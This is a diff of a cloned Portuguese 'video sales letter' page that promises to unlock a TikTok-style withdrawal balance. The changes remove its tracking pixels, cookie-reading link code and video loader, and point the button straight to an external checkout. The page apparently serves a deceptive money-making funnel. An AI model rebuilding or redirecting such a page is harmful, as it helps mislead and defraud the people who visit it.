@@ -1,58 +1,13 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-<!-- Mirrored from pegaadica.online/vsl/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Nov 2024 01:04:15 GMT -->
 
 <head>
-    <script async="" src="js/fbevents.js"></script>
-    <script src="js/latest_1.js" data-utmify-prevent-subids="" async="" defer=""></script>
-   
-    <script async="" defer="" src="js/pixel.js"></script><!-- Meta Pixel Code -->
-   
-   
-    <!-- End Meta Pixel Code -->
-
-    <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
-
-    
-    <script async="" defer="" src="js/pixel.js"></script>
-    <script async="" defer="" src="js/pixel_1.js"></script>
-
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="stylesheet" href="css2.html">
     <title>Programa Inter - VSL</title>
     <link rel="icon" href="images/Logo%20TTK.png" type="image/x-icon">
-
-    <script>
-    // Função para obter o valor de um cookie específico
-    function getCookie(name) {
-        const value = "; " + document.cookie;
-        const parts = value.split("; " + name + "=");
-        if (parts.length === 2) return parts.pop().split(";").shift();
-    }
-
-    // Função para atualizar o link do botão de checkout
-    document.addEventListener("DOMContentLoaded", function () {
-        // Obtém o valor do cookie 'src'
-        const srcCookie = getCookie('src');
-
-        // Seleciona o botão de checkout
-        const checkoutLink = document.querySelector(".centralizar a");
-
-        if (checkoutLink) {
-            // Define o link fixo (adicione seu link no local indicado abaixo)
-            checkoutLink.href = "https://novidadesdigital.pages.dev/tiktoksaque/";
-
-            // Opcionalmente, adiciona o parâmetro 'src' se o cookie existir
-            if (srcCookie) {
-                checkoutLink.href += "?src=" + srcCookie;
-            }
-        }
-    });
-</script>
-
-
 
     <style>
         * {
@@ -96,7 +51,6 @@
 
         #logo {
             width: 130px;
-            /* Aumenta o tamanho do logotipo */
             margin-left: 5px;
         }
 
@@ -147,7 +101,6 @@
             border-radius: 8px;
             margin-bottom: 20px;
             position: relative;
-
         }
 
         iframe {
@@ -191,8 +144,18 @@
             }
         }
     </style>
-    <script src="js/player_1.js" async=""></script>
-    <script src="js/player.js" async=""></script>
+
+    <script>
+        // Redefine o link do botão diretamente
+        document.addEventListener("DOMContentLoaded", function () {
+            const checkoutLink = document.querySelector(".centralizar a");
+
+            if (checkoutLink) {
+                // Define o link fixo para redirecionamento correto
+                checkoutLink.href = "https://novidadesdigital.pages.dev/tiktoksaque/";
+            }
+        });
+    </script>
 </head>
 
 <body>
@@ -212,39 +175,16 @@
         <h4>DESBLOQUEIO DE SALDO</h4>
         <p>Veja como liberar seu saque assistindo ao vídeo.</p>
 
-        <div id="vid_678341025a17fcddc002487a"
-            style="position: relative; width: 100%; padding: 178.33333333333334% 0 0;"> <img
-                id="thumb_678341025a17fcddc002487a" src="images/thumbnail.jpg"
-                style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; display: block;"
-                alt="thumbnail">
-            <div id="backdrop_678341025a17fcddc002487a"
-                style=" -webkit-backdrop-filter: blur(5px); backdrop-filter: blur(5px); position: absolute; top: 0; height: 100%; width: 100%; ">
-            </div>
+        <div id="video-container">
+            <iframe src="https://www.youtube.com/embed/example" frameborder="0" allowfullscreen></iframe>
         </div>
-        <script type="text/javascript"
-            id="scr_678341025a17fcddc002487a"> var s = document.createElement("script"); s.src = "https://scripts.converteai.net/a3302cda-1c0f-4b21-b72a-d316080d4cb7/players/678341025a17fcddc002487a/player.js", s.async = !0, document.head.appendChild(s); </script>
-        <style>
-            .elementor-element:has(#smartplayer) {
-                width: 100%;
-            }
-        </style>
 
-        <style>
-            .espacamento {
-                margin-top: 20px;
-                /* Adiciona espaço acima */
-                margin-bottom: 20px;
-                /* Adiciona espaço abaixo */
-            }
-        </style>
-
-        <div class="espacamento"></div>
-        <div>ㅤ</div>
-        <div>ㅤ</div>
-
+        <div class="centralizar">
+            <a href="https://novidadesdigital.pages.dev/tiktoksaque/" target="_blank">
+                <button>DESBLOQUEAR AGORA</button>
+            </a>
+        </div>
     </div>
-
 </body>
-<!-- Mirrored from pegaadica.online/vsl/ by HTTrack Website Copier/3.x [XR&CO'2014], Wed, 20 Nov 2024 01:04:16 GMT -->
 
 </html>
